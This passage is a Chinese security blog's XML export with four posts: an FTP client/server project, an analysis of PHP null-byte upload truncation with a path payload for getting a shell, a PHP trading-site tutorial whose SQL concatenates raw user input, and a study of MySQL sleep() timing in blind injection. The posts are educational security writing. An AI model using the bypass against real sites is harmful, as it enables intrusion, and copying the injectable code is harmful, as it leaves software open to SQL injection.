        <category>渗透测试</category>
        <category>GETSHELL</category>
        <category>解析漏洞细节</category>
      </categories>
      <tags>
        <tag>知识细节,渗透测试,解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FTP客户端和服务端的编写]]></title>
    <url>%2FFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E7%BC%96%E5%86%99.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;此作品是为了完成Windows网络编程大作业而设计的一个模拟Win自带的FTP客户端和FTP服务端实现文件传输的小工具，Bug还很多，功能也比较有限，发出来权当为学弟学妹们做贡献，最后会附上Win网络编程的所有实验内容、实验代码和实验报告。 程序设计思路 1.客户端要支持ls、pwd、cd、put、get指令，对于ls、pwd、cd指令可直接将命令发送到服务端，然后接收服务端的回复。 2.客户端对put指令的处理，客户端检测用户数据的put指令是否正确，如果正确则以二进制形式打开文件，将文件内容发送到服务端，再接收服务端的回复。 3.客户端对get指令的处理，客户端直接将get指令发送到服务端执行，如果收到客户端回复的文件标识符(file)，则再进行一次数据接收，并将接收到的数据存放在文件内 4.服务端可以设置FTP的目录，让用户只能查看该目录下的文件和文件夹 5.服务器端对ls指令的处理：用subprocess来生成一个线程执行列目录指令(win下：dir命令；linux下：ls命令) 6.服务器对pwd和cd指令的处理：对于pwd指令，可以直接输出全局变量ftpPath，对于cd指令则改变ftpPath变量的值，支持cd .. 和cd 目录 形式 7.服务器对get指令的处理，从指令中拿出文件名，然后以二进制形式打开，将其数据进行base64编码，然后发送给客户端 8.服务器对put指令的处理，从指令中拿出文件名，然后以二进制形式打开文件，将数据进行base64解码，然后写入文件。 程序原理图FTP客户端 FTP服务端 Main函数流程图 recvCommad函数流程图 execCommand函数流程图 程序运行截图客户端连接 ls指令 pwd指令 cd指令 put指令 get指令 bye 程序源码等&emsp;&emsp;FTP客户端与服务端代码下载地址：https://github.com/admintony/FTPClient-FTPServer &emsp;&emsp;Windows网络编程实验内容下载： 链接：https://pan.baidu.com/s/1D3q-nynGBmu--LRg7yvgMw 密码：su9i &emsp;&emsp;Windows网络编程实验代码下载： 链接：https://pan.baidu.com/s/1BHshzvfIfDjKbZdsE6oYtg 密码：cs3g &emsp;&emsp;Windows网络编程实验报告下载： 链接：https://pan.baidu.com/s/1OaFoUx9RUzxJccyB9d973w 密码：dkuw]]></content>
      <categories>
        <category>Python</category>
        <category>代码练习</category>
        <category>FTP客户端与服务端</category>
      </categories>
      <tags>
        <tag>FTP,Socket,Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于上传中的00截断分析]]></title>
    <url>%2F%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;关于上传中00截断的细节，很多朋友在渗透中都会发现一些这样的有趣现象，这个站点使用00截断上传的方法上传成功了，而换一个站点又失败了，这是什么原因呢？你看了这篇文章就会明白。 00截断原理&emsp;&emsp;0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。 00截断的限制条件1PHP&lt;5.3.29，且GPC关闭 00截断的利用方法上传文件后缀检测代码12345678910111213$uploaded_name = $_FILES[ 'file' ][ 'name' ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" )) &#123; move_uploaded_file($_FILES["file"]["tmp_name"], $dir . $target_name); // 将临时文件移动到指定目录 $result = $dir . $target_name; echo "Stored in: $result"; &#125;else&#123; echo "Invalid file";&#125; 误区&emsp;&emsp;有很多朋友喜欢在文件名中加%00进行截断，笔者认为这种方式是不对的，为什么呢？比如攻击者构造文件名：admintony.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？) 正确用法&emsp;&emsp;那么00截断应该在什么时候使用呢？笔者认为，数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00 &emsp;&emsp;为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.php，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。 疑问： &emsp;&emsp;为什么效果图中打印的结果和预期不符，是因为echo的特殊性质，官方解释的echo： &emsp;&emsp;正是因为echo可以输出多个字符串，一个字符串截断后就变成了两个字符串，所以会输出后面的内容。 %00和%00(urldecode)&emsp;&emsp;在网上常见用Burp将数据包中的%00进行urldecode的操作，那为什么要进行这一个操作？网上也常见直接放入%00就可以截断成功的案例，为什么呢？ %00(urldecode) &emsp;&emsp;首先解释为什么要进行urldecode操作呢？其原因在于上传的表单中有一个enctype的属性，并且需要enctype=&quot;multipart/form-data&quot; (不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。 %00 &emsp;&emsp;那么为什么网上也有直接添加%00而不进行urldecode操作呢？因为path也可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urldecode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在非enctype=multipart/form-data的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>GETSHELL</category>
        <category>00截断</category>
      </categories>
      <tags>
        <tag>渗透测试,安全培训,00截断,文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BootStrap+PHP编写信息系统]]></title>
    <url>%2FBootStrap-PHP%E7%BC%96%E5%86%99%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F.html</url>
    <content type="text"><![CDATA[目录结构12345678910111213141516171819202122232425262728293031|- bs # Bootstrap3的js|- config # 系统配置文件|- css # Bootstrap4的js|- fonts # Bootstrap4的fonts|- js # Bootstrap4的js||- showItem # 显示物品| |- addMes.php # 添加留言| |- favorite.php # 收藏物品| |- index.php # 显示物品||- uploads # 上传图片存放的目录||- user # 用户相关的目录| |- checklogin.php # 登录验证| |- delFavo.php # 取消收藏| |- delGood.php # 删除物品| |- index.php # 用户首页| |- login.php # 登录界面| |- loginout.php # 注销登录| |- myFavorite.php # 查看我的收藏| |- myGood.php # 查看我发布的物品| |- register.php # 注册| |- resetPass.php # 修改密码||- addGood.php # 发布物品|- addMess.php # 发布留言|- header.php # 站点头部文件|- index.php # 主页|- upload_file.php # 上传文件|- db.sql # 数据库文件 数据库设计user 用户表 123456789101112/* user 用户信息表*/CREATE TABLE user(id int auto_increment primary key,username char(20) not null unique,password char(40) not null,email char(40) not null unique,photo char(88) default 'img/nophoto.gif',reg_date TIMESTAMP default CURRENT_TIMESTAMP -- 自动获取默认创建时间，不需要可以添加)character set utf8; good 物品表 1234567891011121314151617/* good 物品表*/CREATE TABLE good(id int auto_increment primary key,title char(20) not null,descr varchar(500) not null,newOld char(20) not null,wanted char(80) not null,qq char(20) not null,tel char(20),city char(20),image char(60),username char(40) not null,insert_date TIMESTAMP default CURRENT_TIMESTAMP )character set utf8; message 物品留言表 1234567891011/* message 留言表 */CREATE TABLE message(mid int auto_increment primary key,username char(40) not null,content varchar(100) not null,insert_date TIMESTAMP default CURRENT_TIMESTAMP,pid int not null )character set utf8; favorite 收藏表12345678/* favorite 收藏表*/CREATE TABLE favorite(id int auto_increment primary key,username char(40) not null,pid int not null)character set utf8; 系统功能实现头部代码header.phpis_login检测&emsp;&emsp;is_login检测是用来检测用户是否登陆的代码，存放在header.php中。检测用户是否登陆的方法：启动session，然后检测session数组中是否存在username键，username键的值就是用户名。 &emsp;&emsp;检测登陆的目的： 1.决定输出注册和登陆按钮还是输出用户的个人下拉菜单 2.很多登陆后才具有权限操作的地方要判断是否登陆(可直接包含header.php)，比如：登陆界面、修改个人信息界面、添加留言界面、发布物品界面。 123456$is_login = false;session_start();if(isset($_SESSION['username']))&#123; $username = $_SESSION['username']; $is_login = true;&#125; 导航栏&emsp;&emsp;如果用户未登陆，则右侧导航栏显示”注册”、”登陆” 按钮，如果用户登陆则右侧显示下拉菜单(个人中心，我的发布，我的收藏，注销登陆) 12345&lt;?php if($is_login)&#123;?&gt;// html 下拉菜单&lt;?php &#125;else&#123;?&gt;// html 登陆 、注册按钮&lt;?php &#125;?&gt; &emsp;&emsp;导航栏的active(设置哪个按钮被选中)管理：在每个页面中加入自己的标志，存放于$here中，然后在header中用switch case语句进行选择。 12345678910// 注意$here赋值要在包含header.php前面switch($here)&#123; case 'login': //登陆按钮 ative break; .... default: //主页按钮 active break;&#125; 注意事项： &emsp;&emsp;/user/login.php 包含 header.php而header.php包含config/config.php的问题：此时当前目录会变成/user/ 如果header中包含./config/config.php,则会在/user/config/中寻找config.php，而如果header中包含config/config.php，那么先会/user/config/寻找，如果没有则以header所在目录为根目录寻找config/config.php 登陆相关&emsp;&emsp;涉及文件： 12user/login.phpuser/checklogin.php user/login.php 登陆表单&emsp;&emsp;login.php中有登陆表单，并且包含header.php。 &emsp;&emsp;login.php中直接调用header.php中的变量$is_login来判断用户是否登陆，如果已登陆则直接跳转到”个人中心”，否则显示登陆表单(表单的action属性指向checklogin.php)。 1234567891011&lt;?php @require('./../config/config.php');?&gt;&lt;?php $here = 'login';require('../header.php');if($is_login)&#123; die(header("Location: ".$basedir."user/index.php"));&#125;?&gt;&lt;html&gt;...(表单html)&lt;/html&gt; user/checklogin.php 登陆验证&emsp;&emsp;登陆验证主要做两个方面： 1.判断账号密码是否正确 123456789101112131415161718 /** 1.判断账号密码是否正确*/// 1.1 接收登陆界面传递来的数据 $username = $_POST['username'];$password = md5($_POST['password']);// 1.2 拼接SQL语句，带入数据库查询$sql = "select * from user where username='$username' and password='$password'";$res = mysql_query($sql) or die("&lt;script&gt;alert('数据库查询出错!');&lt;/script&gt;");$row = mysql_fetch_assoc($res);if(!$row)&#123; echo "&lt;script&gt;alert('账号或密码错误！');&lt;/script&gt;"; echo "&lt;script&gt;history.go(-1);&lt;/script&gt;"; exit();&#125; 2.设置session 123 session_start();$_SESSION['username']=$username;header("Location: $basedir".'user/login.php'); 上传图片upload.php&emsp;&emsp;上传图片的功能单独写到一个php中，因为站点内有多处图片上传点，这样可以复用代码，不用过多的写重复代码。 1.检测是存在file 123if(isset($_FILES['file']))&#123; ...&#125; 2.安全性检测1 - Content-type验证 1234567if ((($_FILES["file"]["type"] == "image/png")|| ($_FILES["file"]["type"] == "image/jpeg")|| ($_FILES["file"]["type"] == "image/gif")))&#123; ...&#125;else&#123; echo "&lt;script&gt;alert('Invalid file!');&lt;/script&gt;"; echo "&lt;script&gt;history.go(-1);&lt;/script&gt;";&#125; 3.获取上传文件的信息 123$uploaded_name = $_FILES[ 'file' ][ 'name' ]; // 从数据包获取上传的文件名$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); // 提取文件名中的后缀，用于后面检测后缀$target_name = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // 生成一个独一无二的md5作为文件名存放在本地 4.安全性检测2 - 后缀名检测 123456if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ))&#123; ...&#125;else&#123; echo "&lt;script&gt;alert('Invalid file!');&lt;/script&gt;"; echo "&lt;script&gt;history.go(-1);&lt;/script&gt;";&#125; 5.移动临时文件，并将图片完整路径赋值给$result &emsp;&emsp;PHP的文件上传，上传后的文件是一个临时文件.tmp文件,需要将其移动到指定目录下，并重命名。 1234567891011$dir = "uploads/";if (file_exists("$dir" . $target_name))&#123; echo $_FILES["file"]["name"] . " already exists. ";&#125;else&#123; move_uploaded_file($_FILES["file"]["tmp_name"],"$dir" . $target_name); $result = $dir . $target_name; //echo "$result";&#125; 发布物品addGood.php 1.包含header.php并检测用户是否登录 12345678include('config/config.php');$here = 'addGood';include('header.php');if(!$is_login)&#123; header('location:'.$basedir.'user/login.php'); exit();&#125;header('Content-type:text/html;charset=utf8'); 2.如果存在$_POST[‘submit’]则接收数据，并检测数据 &emsp;&emsp;因为表单也是像这个界面提交的，所以我们需要判断是访问物品发布界面还是已经填写完信息后的发布物品，使用isset($_POST[&#39;submit&#39;])可以判断，因为如果在addGood.php点击发布物品按钮产生的访问请求中，存在该参数，而从主页或其他地方进入发布物品界面则不会有$_POST[&#39;submit&#39;] 123456789101112131415161718if(isset($_POST['submit']))&#123; // 第一步：接收参数 $title = $_POST['title']; $desc = $_POST['desc']; $newOld = $_POST['newOld']; $wanted = $_POST['wanted']; $qq = $_POST['qq']; $tel = $_POST['tel']; $city = $_POST['city']; // 第二步：数据判断 if(empty($title)&amp;&amp;empty($desc)&amp;&amp;empty($newOld)&amp;&amp;empty($wanted)&amp;&amp;empty($qq)&amp;&amp;empty($city)) &#123; echo "&lt;script&gt;alert('请先将所有必填项填写后再提交!');&lt;/script&gt;"; echo "&lt;script&gt;history.go(-1);&lt;/script&gt;"; exit(); &#125;&#125; 3.在尾部添加向数据库插入数据的代码 &emsp;&emsp;插入数据库代码必须在包含upload_file.php后面，否则无法访问到$result变量的值。 123456789101112131415161718&lt;?php if(isset($_POST['submit']))&#123; //echo"$title &amp;&amp; $desc &amp;&amp; $newOld &amp;&amp; $wanted &amp;&amp; $qq &amp;&amp; $tel &amp;&amp; $city &amp;&amp; $result &amp;&amp; username"; $sql = "INSERT INTO good(title,descr,newOld,wanted,qq,tel,city,image,username) VALUES('$title','$desc','$newOld','$wanted','$qq','$tel','$city','$result','$username')"; $res = mysql_query($sql); if(!$res)&#123; echo "&lt;script&gt;alert('插入失败!');&lt;/script&gt;"; echo "&lt;script&gt;history.go(-1);&lt;/script&gt;"; //echo $sql; &#125;else&#123; $sql = "select id from good where image='$result'"; $res = mysql_query($sql); $row = mysql_fetch_assoc($res); $id = $row['id']; echo "&lt;script&gt;alert('插入成功!');window.location.href='showItem/index.php?id=$id';&lt;/script&gt;"; &#125; &#125;?&gt; 查看物品相关功能&emsp;&emsp;涉及文件： 12showItem/index.php # 显示物品showItem/addMess.php # 添加留言 显示物品信息 1.检测URL中是否存在id参数 &emsp;&emsp;如果没有id参数就结束程序。 123456if(!isset($_GET['id']))&#123; // 没有id参数 echo "&lt;script&gt;alert('Error id!');window.location.href='../index.php';&lt;/script&gt;"; exit();&#125; 2.从good表中查询信息 &emsp;&emsp;如果信息不为空，那么说明记录存在，则把查询出来的记录存放在$row变量中，供后面调用。如果信息为空，说明该id在数据库中不存在，则提示Error id!程序退出。 12345678910$id = $_GET['id'];$sql = "select * from good where id='$id'";$res = mysql_query($sql);$row = mysql_fetch_assoc($res);// 数据库不存在的idif(!$row)&#123; echo "&lt;script&gt;alert('Error id!');window.location.href='../index.php';&lt;/script&gt;"; exit();&#125; 3.拼接html和数据库的信息，以期望交换的物品为例 &emsp;&emsp;因为多个期望交换的物品是以;隔开的，因此我们需要先以;为单位，分割字符串，分割后的每一个子串就是一个期望的物品，然后用foreach遍历数据，将数据中的信息打印到html的指定位置。 123456789101112131415&lt;div class="col-md-4"&gt; &lt;div class="card"&gt; &lt;h5 class="card-header"&gt; 期望交换的物品 &lt;/h5&gt; &lt;?php $wanted = explode(";",$row['wanted']);?&gt; &lt;div class="card-body"&gt; &lt;?php foreach($wanted as $k=&gt;$v)&#123;?&gt; &lt;p class="card-footer"&gt; &lt;?php echo $v;?&gt; &lt;/p&gt; &lt;?php &#125;?&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 4.发表留言按钮 &emsp;&emsp;设置留言块div的id为message,然后将发布留言按钮的href指向#message锚点即可。 1&lt;a href="#message" class="btn btn-secondary btn-block btn-lg" type="button"&gt;发布留言&lt;/a&gt; 5.收藏物品按钮 &emsp;&emsp;将该物品的username字段内容作为user/showuser.php?user=的值查询即可。 1&lt;a href="favorite.php?pid=&lt;?php echo $id;?&gt;" class="btn btn-secondary btn-lg btn-block" type="button"&gt;收藏物品&lt;/a&gt; 添加物品留言addMes.php 1.将留言内容和物品id提交给showItem/addMes.php界面 2.showItem/addMes.php检测提交信息，并补全username 1234567891011121314151617181920212223242526272829@include('../config/config.php');header('Content-type:text/html;charset=utf8');if(!isset($_POST['content']))&#123; echo "&lt;script&gt;alert('非法访问!');history.go(-1);&lt;/script&gt;"; exit();&#125;if(empty($_POST['content']))&#123; echo "&lt;script&gt;alert('留言内容不能为空!');history.go(-1);&lt;/script&gt;"; exit();&#125;if( (!isset($_POST['pid'])) || empty($_POST['pid']))&#123; echo "&lt;script&gt;alert('非法访问!');history.go(-1);&lt;/script&gt;";&#125;SESSION_START();if($_SESSION['username']=='')&#123; header('location:'.$basedir.'user/login.php'); exit();&#125;$username = $_SESSION['username'];$content = $_POST['content'];$pid = $_POST['pid']; 3.数据检测并插入数据库后返回显示物品界面 123456789$sql = "INSERT INTO message(pid,content,username) VALUES('$pid','$content','$username')";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('留言失败!');history.go(-1);&lt;/script&gt;"; exit();&#125;else&#123; echo "&lt;script&gt;alert('留言成功!');window.location.href='$basedir/showItem/?id=$pid#message';&lt;/script&gt;";&#125; 显示物品留言 1.从message表中查询并显示留言每页3条 123第一步：查询当前物品的留言条数确定$page_max第二步：根据page确定显示哪3条第三步：将内容打印在对应html中 1234567891011121314151617181920212223242526272829// 查询当前物品的留言条数确定$page_max$page = isset($page) ? $page : '1';$sql = "select count(*) as num from message where pid=$id";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('数据库查询失败!');window.location.href='../index.php';&lt;/script&gt;"; exit();&#125;$row1 = mysql_fetch_assoc($res);$page_max = ceil($row1['num']/3);if($page &gt; $page_max)&#123; echo "&lt;script&gt;alert('Page num illegal!');history.go(-1);&lt;/script&gt;";&#125;// 根据page确定显示哪3条$offset = ($page-1)*3;$sql = "select * from message where pid=$id limit $offset,3";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('数据库查询失败!');window.location.href='../index.php';&lt;/script&gt;"; exit();&#125;$rows = array();while($row2 = mysql_fetch_assoc($res))&#123; $rows[] = $row2;&#125; 2.显示留言翻页 &emsp;&emsp;无留言情况： 收藏物品favorite.php&emsp;&emsp;把物品的id作为GET参数传递给favorite.php，然后再获取用户的用户名，一并存入favorite表中。 1234567891011121314151617181920212223242526header("Content-type:text/html;charset=utf8");@include('../config/config.php');if( (!isset($_GET['pid'])) || empty($_GET['pid']) )&#123; echo "&lt;script&gt;alert('非法访问!');history.go(-1);&lt;/script&gt;";&#125;SESSION_START();if($_SESSION['username']=='')&#123; header('location:'.$basedir.'user/login.php'); exit();&#125;$username = $_SESSION['username'];$pid = $_GET['pid'];$sql = "INSERT INTO favorite(username,pid) VALUES('$username','$pid')";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('收藏失败!');history.go(-1);&lt;/script&gt;"; exit();&#125;else&#123; echo "&lt;script&gt;alert('收藏成功!');history.go(-1);&lt;/script&gt;";&#125; 主页 index.php 1.轮播图的设置 &emsp;&emsp;把数据库中按照id的降序排序，查询出3条记录，然后将此3条记录中的tilte 、 descr 和 image输出到轮播图的前端中。 123456789101112// 1.先查询轮播图的信息$sql = 'select * from good order by id desc limit 0,3';$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('数据库查询出错，请检查数据库配置!');&lt;/script&gt;"; exit();&#125;$rows=array();while($row=mysql_fetch_assoc($res))&#123; $rows[] = $row;&#125; 2.每页显示6个物品 &emsp;&emsp;每页显示6个物品，设置偏移量offset来从数据库查询指定页面的条目。 1234567891011121314$page = isset($_GET['page']) ? $_GET['page'] : '1';$offset = ($page-1) * 6;$sql = "select * from good order by id desc limit $offset,6";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('数据库查询出错，请检查数据库配置!');&lt;/script&gt;"; exit();&#125;$card_rows = array();while($row=mysql_fetch_assoc($res))&#123; $card_rows[] = $row;&#125; &emsp;&emsp;然后将条目中的内容输出到前端的指定位置，但descr只输出36个汉字(108字节)的数据。 &emsp;&emsp;查看和分享 3.翻页设置 12345678910// 3.翻页 - 从数据库中查出所有的记录数量，然后/6 = pageMax$sql = "select count(*) as num from good";$res = mysql_query($sql);if(!$res)&#123; echo "&lt;script&gt;alert('数据库查询出错，请检查数据库配置!');&lt;/script&gt;"; exit();&#125;$row = mysql_fetch_assoc($res);$pageMax = ceil($row['num']/6); 用户后台相关&emsp;&emsp;涉及文件 1234567user/index.php #用户后台主页user/delFavo.php # 删除收藏user/delGood.php # 删除发布的物品user/myGood.php # 显示用户自己发布的物品user/myFavorite.php # 显示用户的收藏user/resetPass.php # 重置密码user/loginout.php # 退出登录 用户后台主页user/index.php 1.检测用户是否登录 12345session_start();if(!isset($_SESSION['username']))&#123; die(Header('Location: '.$basedir.'user/login.php'));&#125; 2.查询用户的信息并打印到指定的HTML位置 12345$username=$_SESSION['username'];@include('../config/config.php');$sql = "select * from user where username='$username'";$res = mysql_query($sql);$row = mysql_fetch_assoc($res); 我的物品&emsp;&emsp;为了将用户发布的物品展示到后台，采用action参数决定后台的显示。 1.接收action参数 1234if(isset($_GET['action']))&#123; $page=$_GET['action'];&#125; 2.根据参数来包含文件 3.显示物品功能的实现myGood.php &emsp;&emsp;先判断用户是否登录，然后将用户的用户名作为引索到good表中查询。 1234567891011121314include('../config/config.php');session_start();if(!isset($_SESSION['username']))&#123; die(Header('Location: '.$basedir.'user/login.php'));&#125;$username = $_SESSION['username'];$sql = "select * from good where username='$username' order by id desc";$res = mysql_query($sql);$rows_table = array();while($row_table=mysql_fetch_assoc($res))&#123; $rows_table[]=$row_table;&#125; &emsp;&emsp;用一个table来显示结果 &emsp;&emsp;其中，查看物品引一个链接到showItem/index.php,删除物品的实现：接收一个参数物品的id，然后先检测物品的主人是不是当前登录的用户，如果是则删除该物品，如果不是则提示非法访问，代码实现如下： 12345678910111213141516171819202122Header('Content-type:text/html;charset=utf-8');@include('../config/config.php');$id = $_GET['id'];$sql = "select username from good where id=$id";$res = mysql_query($sql);$row = mysql_fetch_assoc($res);SESSION_START();if($_SESSION['username']!==$row['username'])&#123; echo "&lt;script&gt;非法操作&lt;/script&gt;"; exit();&#125;$sql = "delete from good where id=$id";$res = mysql_query($sql);if($res)&#123; echo "&lt;script&gt;alert('删除成功!');window.location.href='$basedir/user/?action=showItem';&lt;/script&gt;";&#125;else&#123; echo "&lt;script&gt;alert('删除失败');history.go(-1);&lt;/script&gt;";&#125; 4.物品发布 &emsp;&emsp;直接一个超链接到addGood.php即可。 我的收藏&emsp;&emsp;收藏列表也是通过action参数，将收藏显示实现界面包含在后台主页的。 1.查询用户的收藏 1234567891011121314@include('../config/config.php');if(!isset($_SESSION['username']))&#123; die(Header('Location: '.$basedir.'user/login.php'));&#125;$username = $_SESSION['username'];$sql = "select * from favorite where username='$username'";$res = mysql_query($sql);//var_dump($res);$rows_table1 = array();while($row_table1 = mysql_fetch_assoc($res))&#123; $rows_table1[]=$row_table1;&#125; 2.将收藏信息打印到表格中 &emsp;&emsp;由于收藏表只记录了用户名和收藏的物品id，所以需要到good表中去查询具体的物品信息。 3.查看收藏的物品详情 &emsp;&emsp;打印出的表格会有一个按钮，是查看收藏物品的详情的，如下图： &emsp;&emsp;其实现方法就是把物品id作为参数，超链接到showItem/index.php 4.取消收藏 &emsp;&emsp;其实现方法就是把物品id作为参数，超链接到user/delFavo.php 123456789101112131415161718192021222324&lt;?php Header('Content-type:text/html;charset=utf-8'); @include('../config/config.php'); $id = $_GET['id']; $sql = "select username from favorite where id=$id"; $res = mysql_query($sql); $row = mysql_fetch_assoc($res); SESSION_START(); if($_SESSION['username']!==$row['username']) &#123; echo "&lt;script&gt;非法操作&lt;/script&gt;"; exit(); &#125; $sql = "delete from favorite where id=$id"; $res = mysql_query($sql); if($res) &#123; echo "&lt;script&gt;alert('取消收藏成功!');window.location.href='$basedir/user/?action=favorite';&lt;/script&gt;"; &#125; else &#123; echo "&lt;script&gt;alert('取消收藏失败');history.go(-1);&lt;/script&gt;"; &#125;?&gt; 用户操作 1.修改密码 &emsp;&emsp;在用户主页包含resetPass.php，resetPass.php的实现：1.接收参数，检查参数；2.检测旧密码是否正确；3.新密码是否相同，如果相同则修改。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354include('../config/config.php');if(isset($_POST['submit']))&#123; // 1.接收参数，检查参数 if(isset($_POST['oldPass']) &amp;&amp; isset($_POST['newPass']) &amp;&amp; isset($_POST['newPass1'])) &#123; $oldPass = $_POST['oldPass']; $newPass = $_POST['newPass']; $newPass1 = $_POST['newPass1']; if($oldPass &amp;&amp; $newPass &amp;&amp; $newPass1) &#123; &#125; else &#123; echo "&lt;script&gt;alert('密码不能为空!');history.go(-1);&lt;/script&gt;"; exit(); &#125; &#125; else&#123; echo "&lt;script&gt;alert('非法访问!');history.go(-1);&lt;/script&gt;"; exit(); &#125; // 2.检测旧密码是否正确 session_start(); $username = $_SESSION['username']; $oldPass = md5($oldPass); $sql = "select password from user where username='$username'"; $res = mysql_query($sql); $row = mysql_fetch_assoc($res); if($row['password']!==$oldPass) &#123; echo "&lt;script&gt;alert('旧密码不正确!');history.go(-1);&lt;/script&gt;"; exit(); &#125; // 3.新密码是否相同，如果相同则修改 if($newPass!==$newPass1) &#123; echo "&lt;script&gt;alert('新密码与重复新密码不同!');history.go(-1);&lt;/script&gt;"; exit(); &#125; $newPass = md5($newPass); $sql = "UPDATE user SET password='$newPass' where username='$username'"; $res = mysql_query($sql); if($res) &#123; echo "&lt;script&gt;alert('修改密码成功!');window.location.href='$basedir/user/index.php';&lt;/script&gt;"; &#125;else &#123; echo "&lt;script&gt;alert('修改密码失败!');history.go(-1);&lt;/script&gt;"; &#125;&#125; 2.注销登录 &emsp;&emsp;超链接到loginout.php，其实现方法就是把session删掉。 123456&lt;?phpinclude('../config/config.php');session_start();unset($_SESSION['username']);header("Location: ".$basedir);?&gt; 成品地址easegood]]></content>
      <categories>
        <category>PHP</category>
        <category>信息系统开发</category>
      </categories>
      <tags>
        <tag>信息系统开发</tag>
        <tag>PHP</tag>
        <tag>BootStrap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL的逻辑运算符(and_or_xor)的工作机制]]></title>
    <url>%2FMySQL%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6-and-or-xor-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6.html</url>
    <content type="text"><![CDATA[起因&emsp;&emsp;在做基于时间盲注测试的时候，发现sleep的时间和预想的时间不同，为了解释此现象，于是乎就开始探究and、or、xor的工作机制。 &emsp;&emsp;如果你以前以为 and sleep(5) 、or sleep(5)就是延时5秒，那恭喜你，这篇文章会让你学到一些东西。 数据库中的内容1234567--MySQL.user 表host user passwordlocalhost root mysql5('root')127.0.0.1 root mysql5('root')192.168.0.100 root mysql5('root')localhost aaa mysql5('root') 测试语句及结果测试语句11mysql&gt; select user,password from user where user='root' and sleep(5); &emsp;&emsp;疑问1：为什么这里是延时了15秒? 测试语句21mysql&gt; select user,password from user where user='aaa' or sleep(5); &emsp;&emsp;疑问2：为什么这里也是延时了15秒？ 测试语句31mysql&gt; select user,password from user where user='root' and host='localhost' or sleep(5); &emsp;&emsp;疑问3：为什么又是15秒？ 测试语句41mysql&gt; select user,password from user where user='root' or sleep(5) and host='localhost'; &emsp;&emsp;终于是5秒了，我仿佛又看到了春天。 测试语句51mysql&gt; select user,password from user where host='localhost' or sleep(5) and user='root'; &emsp;&emsp;疑问4：纳尼？怎么又是10秒了？这究竟发生了什么？ 测试语句61mysql&gt; select user,password from user where host='localhost' or user='root' or sleep(5); &emsp;&emsp;疑问5：纳尼？前面的延时时间比预期的时间长就算了，这个怎么还不延迟了呢？ 测试语句71mysql&gt; select user,password from user where host='localhost' or false and user='root' and sleep(5); &emsp;&emsp;疑问6：0秒？楼主你的MySQL是假的吧。 &emsp;&emsp;让我来一一回答这六个疑问。 and 、or的工作机制&emsp;&emsp;这里要先说明一个问题：sleep(5)&lt;=&gt;false 第一个问题1mysql&gt; select user,password from user where user='root' and sleep(5); &emsp;&emsp;以上语句执行时间为什么是15秒？ &emsp;&emsp;这个问题涉及到了MySQL中and的工作机制，比如where A and B。MySQL会先进行查询满足条件A的结果集： 1select * from user where A; -- 假设返回结果集1 &emsp;&emsp;然后从结果集1中查询满足条件B的： 1select * from 结果集1 where B; &emsp;&emsp;由于满足user=’root’的结果集中包含3个数据，所以sleep(5)被执行了3次，因此延时15秒。 第二个问题1mysql&gt; select user,password from user where user='aaa' or sleep(5); &emsp;&emsp;这个语句为什么也是延时15秒？ &emsp;&emsp;这个问题涉及到了MySQL or的工作机制，比如where A or B，MySQL会先查询出非A的结果集1： 1select * from user where not A; &emsp;&emsp;然后在结果集1中查询出非B的结果集2： 1select * from 结果集1 where not B; &emsp;&emsp;第三步是从user表中查询非结果集2的结果，也就是最终结果： 1select * from user where not 结果集1; 